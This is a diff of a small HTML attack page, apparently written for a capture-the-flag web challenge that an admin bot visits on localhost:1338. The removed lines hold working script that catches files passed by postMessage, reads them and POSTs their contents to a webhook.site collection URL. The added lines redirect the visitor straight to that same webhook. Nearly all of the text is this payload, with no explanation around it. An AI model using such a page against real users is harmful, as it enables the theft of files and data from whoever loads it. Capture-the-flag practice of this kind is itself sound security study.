@@ -1,25 +1,9 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      // Listen for messages from the challenge page
-      window.addEventListener("message", (event) => {
-        if (event.data?.files?.length > 0) {
-          const blob = event.data.files[0].blob;
-          const reader = new FileReader();
-          reader.onload = function () {
-            fetch("https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df", {
-              method: "POST",
-              body: reader.result,
-              headers: { "Content-Type": "text/plain" }
-            });
-          };
-          reader.readAsText(blob);
-        }
-      });
-
-      // Open challenge page (admin loads this, so we simulate what admin sees)
-      const w = window.open("http://localhost:1338/", "_blank");
-    </script>
-  </body>
+<head>
+    <meta http-equiv="refresh" content="0; url=https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df">
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
 </html>
